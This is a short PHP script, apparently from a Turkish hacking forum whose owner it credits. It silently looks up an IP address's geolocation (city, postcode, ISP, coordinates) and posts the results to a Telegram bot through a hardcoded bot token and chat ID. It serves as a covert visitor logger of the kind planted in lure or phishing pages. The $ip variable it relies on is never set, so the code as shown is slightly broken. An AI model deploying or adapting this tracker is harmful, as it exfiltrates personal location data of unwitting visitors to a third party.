<?php

function telegram($msg) {
        global $run,$telegramchatid;
        $url = 'https://api.telegram.org/bot'.$run.'/sendMessage';$data = array('chat_id'=>$telegramchatid,'text'=>$msg);
        $options = array('http'=>array('method' => 'POST','header' => "Content-Type:application/x-www-form-urlencoded\r\n",'content' => http_build_query($data),),);
        $context = stream_context_create($options);
        $result = file_get_contents($url,false,$context);
        return $result;
}

$run = '5055359847:AAGZCWRXgmB7rWAK45zQrB1NWL7ZruK0l9s'; 
$telegramchatid = 1887870506;


$ipapi = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
$datetime = date("d.m.Y H:i:s"); // g:ia l F j Y   l, F j, Y, g:ia




telegram("Yeni kullanım:

        IP  :  $ipapi->query
        Operating system  :  replace in the sub comment
        Browser  :  replace in the sub comment
        Country  :  $ipapi->country ($ipapi->countryCode)
        Region  :  $ipapi->regionName ($ipapi->region)
        City  :  $ipapi->city
        Zip (Postcode)  :  $ipapi->zip
        Time  :  $datetime
        Internet Provider  :  $ipapi->isp ($ipapi->org)
        Saat Dilimi  :  $ipapi->timezone
        Lat & Lon :  $ipapi->lat $ipapi->lon
        Ass  :  $ipapi->as
        


        @TR_HACK_FORUM Owner= @Cakma_H4CK3R
        ");



?>
